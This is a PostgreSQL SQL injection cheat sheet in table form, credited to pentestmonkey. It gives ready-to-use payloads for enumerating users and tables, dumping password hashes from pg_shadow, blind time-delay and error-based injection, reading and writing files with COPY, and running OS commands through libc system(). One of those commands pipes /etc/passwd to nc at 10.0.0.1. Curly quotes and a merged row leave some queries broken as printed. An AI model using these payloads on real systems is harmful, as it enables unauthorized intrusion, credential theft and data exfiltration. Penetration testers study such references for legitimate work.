# All credits to pentestmonkey
|Description| Command|
|--- |--- |
|Version|SELECT version()|
|Comments|SELECT 1; --comment; SELECT /\*comment\*/1; |
|Current User|SELECT user; SELECT current_user; SELECT session_user; SELECT usename FROM pg_user; SELECT getpgusername();|
|List Users|SELECT usename FROM pg_user|
|List Password Hashes|SELECT usename, passwd FROM pg_shadow — priv|
|Password Cracker|MDCrack can crack PostgreSQL’s MD5-based passwords.|
|List Privileges|SELECT usename, usecreatedb, usesuper, usecatupd FROM pg_user|
|Check if you are superuser| SELECT current_setting('is_superuser'); |
|List DBA Accounts|SELECT usename FROM pg_user WHERE usesuper IS TRUE|
|Current Database|SELECT current_database()|
|List Databases|SELECT datname FROM pg_database|
|List Columns|SELECT relname, A.attname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T WHERE (C.relkind=’r') AND (N.oid=C.relnamespace) AND (A.attrelid=C.oid) AND (A.atttypid=T.oid) AND (A.attnum>0) AND (NOT A.attisdropped) AND (N.nspname ILIKE ‘public’)|
|List Tables|SELECT c.relname FROM pg_catalog.pg_class c LEFT JOIN pg_catalog.pg_namespace n ON n.oid = c.relnamespace WHERE c.relkind IN (‘r’,”) AND n.nspname NOT IN (‘pg_catalog’, ‘pg_toast’) AND pg_catalog.pg_table_is_visible(c.oid)|
|Find Tables From Column Name|If you want to list all the table names that contain a column LIKE ‘%password%’:SELECT DISTINCT relname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T WHERE (C.relkind=’r') AND (N.oid=C.relnamespace) AND (A.attrelid=C.oid) AND (A.atttypid=T.oid) AND (A.attnum>0) AND (NOT A.attisdropped) AND (N.nspname ILIKE ‘public’) AND attname LIKE ‘%password%’;|
|Select Nth Row|SELECT usename FROM pg_user ORDER BY usename LIMIT 1 OFFSET 0; — rows numbered from; SELECT usename FROM pg_user ORDER BY usename LIMIT 1 OFFSET 1;|
|Select Nth Char|SELECT substr(‘abcd’, 3, 1); — returns c|
|Bitwise AND|SELECT 6 & 2; — returns 2; SELECT 6 & 1; –returns 0|
|ASCII Value -> Char|SELECT chr(65);|
|Char -> ASCII Value|SELECT ascii(‘A’);|
|Casting|SELECT CAST(1 as varchar); SELECT CAST(’1′ as int);|
|String Concatenation|SELECT ‘A’ || ‘B’; — returnsAB|
|If Statement|IF statements only seem valid inside functions, so aren’t much use for SQL injection.  See CASE statement instead.|
|Case Statement|SELECT CASE WHEN (1=1) THEN ‘A’ ELSE ‘B’ END; — returns A|
|Avoiding Quotes|SELECT CHR(65)||CHR(66); — returns AB|
|Time Delay|SELECT pg_sleep(10); — postgres 8.2+ only; CREATE OR REPLACE FUNCTION sleep(int) RETURNS int AS ‘/lib/libc.so.6′, ‘sleep’ language ‘C’ STRICT; SELECT sleep(10); –priv, create your own sleep function.  Taken from here .|
|Make DNS Requests|Generally not possible in postgres.  However if contrib/dblinkis installed (it isn’t by default) it can be used to resolve hostnames (assuming you have DBA rights): SELECT * FROM dblink('host=put.your.hostname.here user=someuser  dbname=somedb', 'SELECT version()') RETURNS (result TEXT); Alternatively, if you have DBA rights you could run an OS-level command (see below) to resolve hostnames, e.g. “ping pentestmonkey.net”.|
|Command Execution|CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS ‘/lib/libc.so.6′, ‘system’ LANGUAGE ‘C’ STRICT; — privSELECT system(‘cat /etc/passwd | nc 10.0.0.1 8080′); — priv, commands run as postgres/pgsql OS-level user|
|Hostname, IP Address|SELECT inet_server_addr(); — returns db server IP address (or null if using local connection); SELECT inet_server_port(); — returns db server IP address (or null if using local connection)|
|Create Users|CREATE USER test1 PASSWORD ‘pass1′; — priv; CREATE USER test1 PASSWORD ‘pass1′ CREATEUSER; — priv, grant some privs at the same time|
|Drop Users|DROP USER test1; — priv|
|Make User DBA|ALTER USER test1 CREATEUSER CREATEDB; — priv; Location of DB files|SELECT current_setting(‘data_directory’); — priv; SELECT current_setting(‘hba_file’); — priv|
|Default/System Databases|template0; template1
|Dollar Strings| Instead of quotes you can alternatively use $$ (duoble-dollar) for quoting stings, of $ (single-dollar) with tag: SELECT $$TEST$$; SELECT $TAG$TEST$TAG$; |
|Write arbitary data to disc | CREATE TEMP TABLE TEST(data text);INSERT INTO TEST(data) VALUES ($$test$$);COPY TEST(data) TO $$C:\Program Files (x86)\PostgreSQL\9.2\data\test.txt$$ | 
|Read data from file| CREATE TEMP TABLE TEST(data text); COPY TEST from $$C:\Program Files (x86)\PostgreSQL\9.2\data\test.txt$$; |
|Blind CASE query example| SELECT case when (SELECT current_setting($$is_superuser$$))=$$on$$ then pg_sleep(5) end; |
|Error based payloads|(select 1 from box(user))|
